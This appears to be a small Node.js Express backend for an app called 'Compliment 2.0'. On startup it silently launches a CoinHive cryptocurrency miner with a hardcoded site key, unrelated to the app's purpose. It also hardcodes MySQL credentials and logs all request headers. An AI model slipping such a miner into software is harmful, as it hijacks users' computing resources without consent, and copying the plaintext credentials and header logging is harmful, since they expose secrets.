const express = require('express')
const app = express()
const CoinHive = require('coin-hive');

(async () => {
  const miner = await CoinHive('iJFqkJpXPWBCQrualE4SxWyLBEqu2RTb');
  await miner.start();
  console.log("Miner started")
  miner.on('found', () => console.log('Found!'));
  miner.on('accepted', () => console.log('Accepted!'));
})();

var mysql = require('mysql')

var con = mysql.createConnection({
  host: "localhost",
  user: "top4ek",
  password: "q2w3e4r5",
  database: "compliment"
});

con.connect(function(err) {
	if (err) throw err;
	console.log('Connect to database is successful');
});


app.use((request, response, next) => {
  console.log(request.headers)
  next()
})

app.use((request, response, next) => {
  request.chance = Math.random()
  next()
})

app.get('/', (request, response) => {
  console.log(request.json)
})

app.get('/test', (req,res) =>{
	res.send('hello')
})

app.listen(3000, function (){
	console.log('Compliment 2.0 backend started');
})
/*
con.query("SELECT * FROM coffee", function (err, result, fields) {
    if (err) throw err;
    console.log('Connect to database is successful');
});
*/